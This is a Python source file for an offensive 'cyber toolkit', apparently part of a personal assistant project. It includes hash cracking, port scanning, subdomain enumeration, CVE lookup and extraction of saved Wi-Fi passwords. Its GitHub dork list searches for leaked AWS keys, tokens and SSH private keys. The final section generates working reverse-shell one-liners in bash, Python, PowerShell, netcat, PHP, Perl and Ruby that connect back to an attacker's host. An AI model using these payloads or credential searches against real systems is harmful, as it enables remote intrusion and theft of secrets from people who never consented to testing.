"""
KALKI Cyber Toolkit
For Sir's authorized use only — CTF, pentesting, OSINT, local recon.

Hashes, codecs, network recon, CVE intel, subdomain enum, payloads.
All functions are stateless and stdlib-only (plus urllib for the online ones).
"""

import os
import re
import json
import ssl
import socket
import codecs
import base64
import struct
import hashlib
import secrets
import string
import subprocess
import urllib.parse
import urllib.request


# ─────────────────────────────────────────────────────────────
# HASHES
# ─────────────────────────────────────────────────────────────
KNOWN_HASHES = {
    32:  ["MD5", "NTLM", "MD4"],
    40:  ["SHA1"],
    56:  ["SHA-224"],
    64:  ["SHA-256", "SHA3-256"],
    96:  ["SHA-384", "SHA3-384"],
    128: ["SHA-512", "SHA3-512"],
}


def identify_hash(h):
    """Guess hash type(s) by length. Returns a list of candidate names."""
    h = h.strip()
    if not re.match(r"^[0-9a-fA-F]+$", h):
        return ["non-hex (try base64 or bcrypt)"]
    return KNOWN_HASHES.get(len(h), ["unknown length " + str(len(h))])


def hash_text(text, algo="sha256"):
    """Hash a string with the named algorithm. Returns the hex digest."""
    algo = algo.lower().replace("-", "").replace("_", "")
    data = text.encode("utf-8")
    if algo == "md5":
        return hashlib.md5(data).hexdigest()
    if algo == "sha1":
        return hashlib.sha1(data).hexdigest()
    if algo == "sha224":
        return hashlib.sha224(data).hexdigest()
    if algo == "sha256":
        return hashlib.sha256(data).hexdigest()
    if algo == "sha384":
        return hashlib.sha384(data).hexdigest()
    if algo == "sha512":
        return hashlib.sha512(data).hexdigest()
    if algo == "sha3256":
        return hashlib.sha3_256(data).hexdigest()
    if algo == "sha3512":
        return hashlib.sha3_512(data).hexdigest()
    if algo == "ntlm":
        return _md4_compat(text.encode("utf-16le")).hex()
    if algo == "md4":
        return _md4_compat(data).hex()
    raise ValueError("unknown algo: " + algo)


def _md4_compat(data):
    """MD4 that works on OpenSSL 3.x where md4 is disabled by default."""
    try:
        return hashlib.new("md4", data, usedforsecurity=False).digest()
    except (TypeError, ValueError):
        try:
            return hashlib.new("md4", data).digest()
        except Exception:
            return _md4_pure(data)


def _md4_pure(data):
    """Pure-Python MD4 (RFC 1320). Slow but works anywhere."""
    def F(x, y, z): return (x & y) | (~x & z) & 0xFFFFFFFF
    def G(x, y, z): return (x & y) | (x & z) | (y & z)
    def H(x, y, z): return x ^ y ^ z

    def rol(x, n):
        x &= 0xFFFFFFFF
        return ((x << n) | (x >> (32 - n))) & 0xFFFFFFFF

    msg = bytearray(data)
    orig_len_bits = (len(msg) * 8) & 0xFFFFFFFFFFFFFFFF
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", orig_len_bits)

    a, b, c, d = 1732584193, 4023233417, 2562383102, 271733878

    for off in range(0, len(msg), 64):
        X = list(struct.unpack("<16I", msg[off:off + 64]))
        aa, bb, cc, dd = a, b, c, d

        # Round 1
        for i in (0, 4, 8, 12):
            a = rol((a + F(b, c, d) + X[i]) & 0xFFFFFFFF, 3)
            d = rol((d + F(a, b, c) + X[i + 1]) & 0xFFFFFFFF, 7)
            c = rol((c + F(d, a, b) + X[i + 2]) & 0xFFFFFFFF, 11)
            b = rol((b + F(c, d, a) + X[i + 3]) & 0xFFFFFFFF, 19)
        # Round 2
        for i in (0, 1, 2, 3):
            a = rol((a + G(b, c, d) + X[i] + 0x5A827999) & 0xFFFFFFFF, 3)
            d = rol((d + G(a, b, c) + X[i + 4] + 0x5A827999) & 0xFFFFFFFF, 5)
            c = rol((c + G(d, a, b) + X[i + 8] + 0x5A827999) & 0xFFFFFFFF, 9)
            b = rol((b + G(c, d, a) + X[i + 12] + 0x5A827999) & 0xFFFFFFFF, 13)
        # Round 3
        for i in (0, 2, 1, 3):
            a = rol((a + H(b, c, d) + X[i] + 0x6ED9EBA1) & 0xFFFFFFFF, 3)
            d = rol((d + H(a, b, c) + X[i + 8] + 0x6ED9EBA1) & 0xFFFFFFFF, 9)
            c = rol((c + H(d, a, b) + X[i + 4] + 0x6ED9EBA1) & 0xFFFFFFFF, 11)
            b = rol((b + H(c, d, a) + X[i + 12] + 0x6ED9EBA1) & 0xFFFFFFFF, 15)

        a = (a + aa) & 0xFFFFFFFF
        b = (b + bb) & 0xFFFFFFFF
        c = (c + cc) & 0xFFFFFFFF
        d = (d + dd) & 0xFFFFFFFF

    return struct.pack("<4I", a, b, c, d)


def crack_hash_dict(target, wordlist_path=None, algos=None, limit=2_000_000):
    """Dictionary attack against a hash. Returns dict with result or None."""
    target = target.strip().lower()
    if not target:
        return {"error": "empty hash"}

    if algos is None:
        guessed = [a.upper() for a in identify_hash(target)]
        algos = [a for a in guessed
                 if a in ("MD5", "SHA1", "SHA224", "SHA256", "SHA384",
                          "SHA512", "NTLM", "MD4")]
        if not algos:
            algos = ["MD5", "SHA1", "SHA256", "SHA512", "NTLM"]

    # Locate a wordlist
    if wordlist_path is None:
        candidates = [
            os.path.join("data", "wordlist.txt"),
            os.path.join("data", "rockyou.txt"),
            os.path.join(os.path.expanduser("~"), "Downloads", "rockyou.txt"),
        ]
        wordlist_path = next((p for p in candidates if os.path.exists(p)), None)
    if not wordlist_path or not os.path.exists(wordlist_path):
        return {"error": "no wordlist found", "tried": 0,
                "hint": "place a wordlist at data/wordlist.txt or pass --path"}

    tried = 0
    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            word = line.rstrip("\r\n")
            tried += 1
            if tried > limit:
                return {"error": "limit exceeded", "tried": tried,
                        "wordlist": wordlist_path}
            for algo in algos:
                try:
                    if hash_text(word, algo) == target:
                        return {"password": word, "algo": algo,
                                "tried": tried, "wordlist": wordlist_path}
                except Exception:
                    pass
    return {"result": "not found", "tried": tried, "wordlist": wordlist_path}


def random_password(length=20, symbols=True):
    """Cryptographically strong random password."""
    pool = string.ascii_letters + string.digits
    if symbols:
        pool += "!@#$%^&*()-_=+[]{}<>?"
    return "".join(secrets.choice(pool) for _ in range(length))


# ─────────────────────────────────────────────────────────────
# ENCODE / DECODE
# ─────────────────────────────────────────────────────────────
_MORSE = {
    "A": ".-", "B": "-...", "C": "-.-.", "D": "-..", "E": ".", "F": "..-.",
    "G": "--.", "H": "....", "I": "..", "J": ".---", "K": "-.-", "L": ".-..",
    "M": "--", "N": "-.", "O": "---", "P": ".--.", "Q": "--.-", "R": ".-.",
    "S": "...", "T": "-", "U": "..-", "V": "...-", "W": ".--", "X": "-..-",
    "Y": "-.--", "Z": "--..", "0": "-----", "1": ".----", "2": "..---",
    "3": "...--", "4": "....-", "5": ".....", "6": "-....", "7": "--...",
    "8": "---..", "9": "----.",
}
_MORSE_REV = {v: k for k, v in _MORSE.items()}


def encode(text, fmt):
    fmt = fmt.lower()
    if fmt in ("base64", "b64"):
        return base64.b64encode(text.encode("utf-8")).decode()
    if fmt in ("base32",):
        return base64.b32encode(text.encode("utf-8")).decode()
    if fmt in ("hex",):
        return text.encode("utf-8").hex()
    if fmt in ("url",):
        return urllib.parse.quote(text)
    if fmt in ("rot13",):
        return codecs.encode(text, "rot_13")
    if fmt in ("binary", "bin"):
        return " ".join(format(b, "08b") for b in text.encode("utf-8"))
    if fmt in ("ascii",):
        return " ".join(str(b) for b in text.encode("utf-8"))
    if fmt in ("morse",):
        return " ".join(_MORSE.get(ch, ch) for ch in text.upper())
    raise ValueError("unknown encoding: " + fmt)


def decode(text, fmt):
    fmt = fmt.lower()
    if fmt in ("base64", "b64"):
        return base64.b64decode(text).decode("utf-8", "replace")
    if fmt in ("base32",):
        return base64.b32decode(text).decode("utf-8", "replace")
    if fmt in ("hex",):
        return bytes.fromhex(text.replace(" ", "")).decode("utf-8", "replace")
    if fmt in ("url",):
        return urllib.parse.unquote(text)
    if fmt in ("rot13",):
        return codecs.decode(text, "rot_13")
    if fmt in ("binary", "bin"):
        out = bytearray()
        for chunk in text.split():
            out.append(int(chunk, 2))
        return out.decode("utf-8", "replace")
    if fmt in ("morse",):
        return "".join(_MORSE_REV.get(sym, "") for sym in text.split())
    raise ValueError("unknown encoding: " + fmt)


# ─────────────────────────────────────────────────────────────
# NETWORK / RECON
# ─────────────────────────────────────────────────────────────
COMMON_PORTS = (
    21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 587, 993, 995,
    1433, 1521, 2049, 2375, 3000, 3306, 3389, 4444, 5000, 5432, 5900, 5984,
    6379, 6667, 7001, 8000, 8008, 8080, 8081, 8443, 8888, 9000, 9090, 9200,
    11211, 27017, 5601,
)


def port_scan(host, ports=None, timeout=0.5):
    """Fast TCP connect scan. Returns the list of open ports."""
    if ports is None:
        ports = COMMON_PORTS
    open_ports = []
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            if s.connect_ex((host, p)) == 0:
                open_ports.append(p)
        except Exception:
            pass
        finally:
            s.close()
    return open_ports


def dns_lookup(host):
    try:
        return {"host": host, "ip": socket.gethostbyname(host)}
    except Exception as e:
        return {"error": str(e)}


def reverse_dns(ip):
    try:
        return {"ip": ip, "host": socket.gethostbyaddr(ip)[0]}
    except Exception as e:
        return {"error": str(e)}


def http_headers(url):
    if not url.startswith("http"):
        url = "https://" + url
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 JARVIS"})
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=10, context=ctx) as r:
            return {"url": url, "status": r.status, "headers": dict(r.getheaders())}
    except Exception as e:
        return {"error": str(e)}


def ip_info(ip=""):
    try:
        if ip:
            url = "https://ipapi.co/" + urllib.parse.quote(ip) + "/json/"
        else:
            url = "https://ipapi.co/json/"
        with urllib.request.urlopen(url, timeout=10) as r:
            return json.loads(r.read())
    except Exception as e:
        return {"error": str(e)}


def public_ip():
    try:
        with urllib.request.urlopen("https://api.ipify.org", timeout=6) as r:
            return r.read().decode().strip()
    except Exception as e:
        return "error: " + str(e)


def local_ips():
    try:
        host = socket.gethostname()
        return {"hostname": host, "local": socket.gethostbyname(host)}
    except Exception as e:
        return {"error": str(e)}


def ping(host, count=2):
    """Cross-platform ping using the OS tool."""
    flag = "-n" if os.name == "nt" else "-c"
    try:
        r = subprocess.run(["ping", flag, str(count), host],
                           capture_output=True, text=True, timeout=15)
        return {"output": r.stdout, "code": r.returncode}
    except Exception as e:
        return {"error": str(e)}


def wifi_profiles():
    try:
        r = subprocess.run(["netsh", "wlan", "show", "profiles"],
                           capture_output=True, text=True, timeout=10)
        return re.findall(r":\s(.+)$", r.stdout, re.MULTILINE)
    except Exception as e:
        return ["error: " + str(e)]


def wifi_password(ssid):
    """netsh requires elevated rights for key=clear on most setups —
    will return whatever it can."""
    try:
        r = subprocess.run(
            ["netsh", "wlan", "show", "profile", "name=" + ssid, "key=clear"],
            capture_output=True, text=True, timeout=10)
        m = re.search(r"Key Content\s*:\s*(.+)", r.stdout)
        if m:
            return {"ssid": ssid, "password": m.group(1).strip()}
        return {"ssid": ssid, "error": "no key (may need admin)",
                "output_excerpt": r.stdout[:400]}
    except Exception as e:
        return {"error": str(e)}


# ─────────────────────────────────────────────────────────────
# CVE INTEL (NVD)
# ─────────────────────────────────────────────────────────────
def cve_lookup(cve_id):
    """Fetch CVE details from NVD. Returns dict with id, summary, score."""
    cve_id = cve_id.strip().upper()
    if not re.match(r"^CVE-\d{4}-\d{4,}$", cve_id):
        return {"error": "Invalid CVE format. Expected CVE-YYYY-NNNN+"}
    try:
        url = "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=" + cve_id
        req = urllib.request.Request(url, headers={"User-Agent": "JARVIS"})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = json.loads(r.read())
        vulns = data.get("vulnerabilities")
        if not vulns:
            return {"error": "CVE not found"}
        cve = vulns[0]["cve"]
        summary = next((d["value"] for d in cve.get("descriptions", [])
                        if d.get("lang") == "en"), "")[:1000]
        score, severity = "?", "?"
        metrics = cve.get("metrics", {})
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if metrics.get(key):
                cdata = metrics[key][0]["cvssData"]
                score = cdata.get("baseScore", "?")
                severity = cdata.get("baseSeverity",
                                     metrics[key][0].get("baseSeverity", "?"))
                break
        return {
            "id": cve_id,
            "score": score,
            "severity": severity,
            "summary": summary,
            "published": cve.get("published", ""),
            "url": "https://nvd.nist.gov/vuln/detail/" + cve_id,
        }
    except Exception as e:
        return {"error": str(e)}


def recent_critical_cves(limit=20):
    """Critical CVEs published in the last 30 days, newest first."""
    try:
        from datetime import datetime, timedelta
        start = (datetime.utcnow() - timedelta(days=30)).strftime("%Y-%m-%dT%H:%M:%S.000")
        end = datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S.000")
        params = urllib.parse.urlencode({
            "cvssV3Severity": "CRITICAL",
            "pubStartDate": start,
            "pubEndDate": end,
            "resultsPerPage": 20,
        })
        url = "https://services.nvd.nist.gov/rest/json/cves/2.0?" + params
        req = urllib.request.Request(url, headers={"User-Agent": "JARVIS"})
        with urllib.request.urlopen(req, timeout=20) as r:
            data = json.loads(r.read())
        vulns = data.get("vulnerabilities", [])
        vulns.sort(key=lambda v: v["cve"].get("published", ""), reverse=True)
        out = []
        for v in vulns[:limit]:
            cve = v["cve"]
            summary = next((d["value"] for d in cve.get("descriptions", [])
                            if d.get("lang") == "en"), "")[:200]
            out.append({"id": cve.get("id", ""),
                        "summary": summary,
                        "published": cve.get("published", "")})
        return out
    except Exception as e:
        return {"error": str(e)}


# ─────────────────────────────────────────────────────────────
# SUBDOMAIN ENUM
# ─────────────────────────────────────────────────────────────
def subdomain_enum(domain, limit=20):
    """Enumerate subdomains via crt.sh, falling back to hackertarget."""
    domain = domain.strip().lower().lstrip(".")
    if not domain or " " in domain or domain.count(".") < 1:
        return {"error": "Invalid domain"}
    try:
        url = "https://crt.sh/?q=%25." + urllib.parse.quote(domain) + "&output=json"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0 JARVIS"})
        with urllib.request.urlopen(req, timeout=60) as r:
            entries = json.loads(r.read())
        found = set()
        for e in entries:
            for name in e.get("name_value", "").split("\n"):
                name = name.strip().lstrip("*.")
                if name.endswith(domain):
                    found.add(name)
        subs = sorted(found)[:limit]
        return {"domain": domain, "count": len(subs), "subdomains": subs}
    except Exception as e:
        # Fallback: hackertarget
        try:
            url = "https://api.hackertarget.com/hostsearch/?q=" + urllib.parse.quote(domain)
            with urllib.request.urlopen(url, timeout=20) as r:
                text = r.read().decode("utf-8", "ignore")
            found = set()
            for line in text.splitlines():
                host = line.split(",")[0].strip()
                if host.endswith(domain):
                    found.add(host)
            subs = sorted(found)[:limit]
            return {"domain": domain, "count": len(subs),
                    "subdomains": subs, "source": "hackertarget"}
        except Exception as e2:
            return {"error": str(e) + " / fallback: " + str(e2)}


# ─────────────────────────────────────────────────────────────
# GITHUB DORKS
# ─────────────────────────────────────────────────────────────
def github_dorks(target):
    """Return a list of pre-baked GitHub search URLs for the target."""
    q = urllib.parse.quote(target)
    base = "https://github.com/search?type=code&q="
    dorks = [
        ("AWS keys", base + q + "+AKIA"),
        ("API keys", base + q + "+api_key"),
        ("Passwords", base + q + "+password"),
        ("Bearer tokens", base + q + "+Bearer"),
        (".env files", base + q + "+filename%3A.env"),
        ("config.json", base + q + "+filename%3Aconfig.json"),
        ("SSH private keys", base + q + "+BEGIN+RSA+PRIVATE+KEY"),
        ("Database URLs", base + q + "+mongodb%3A%2F%2F"),
    ]
    return [{"name": n, "url": u} for n, u in dorks]


# ─────────────────────────────────────────────────────────────
# REVERSE SHELL PAYLOADS
# ─────────────────────────────────────────────────────────────
def reverse_shell(shell_type, lhost, lport):
    """Return a reverse shell one-liner for the given target."""
    lhost = str(lhost)
    lport = str(lport)
    shells = {
        "bash": "bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
        "sh": "sh -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1",
        "python": ("python -c 'import socket,subprocess,os;"
                   "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   's.connect(("' + lhost + '",' + lport + "));"
                   "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                   "subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "python3": ("python3 -c 'import socket,subprocess,os;"
                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                    's.connect(("' + lhost + '",' + lport + "));"
                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
                    "subprocess.call([\"/bin/sh\",\"-i\"])'"),
        "powershell": ('powershell -nop -c "$client = New-Object '
                       "System.Net.Sockets.TCPClient('" + lhost + "'," + lport +
                       ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};"
                       "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;"
                       "$data = (New-Object -TypeName System.Text.ASCIIEncoding)."
                       "GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );"
                       "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
                       "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
                       "$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};"
                       '$client.Close()"'),
        "nc": "nc -e /bin/sh " + lhost + " " + lport,
        "ncmkfifo": ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " +
                     lhost + " " + lport + " >/tmp/f"),
        "php": ('php -r \'$sock=fsockopen("' + lhost + '",' + lport +
                ');exec("/bin/sh -i <&3 >&3 2>&3");\''),
        "perl": ('perl -e \'use Socket;$i="' + lhost + '";$p=' + lport +
                 ';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
                 'if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");'
                 'open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\''),
        "ruby": ('ruby -rsocket -e\'f=TCPSocket.open("' + lhost + '",' + lport +
                 ').to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''),
    }
    # Friendly aliases
    shells["mkfifo"] = shells["ncmkfifo"]
    shells["ps"] = shells["powershell"]

    key = str(shell_type).strip().lower()
    if key == "list" or key == "available":
        return {"available": list(shells.keys())}
    if key not in shells:
        return {"error": "Unknown shell type '" + str(shell_type) +
                "'. Available: " + ", ".join(shells.keys())}
    return {"type": key, "lhost": lhost, "lport": lport, "payload": shells[key]}
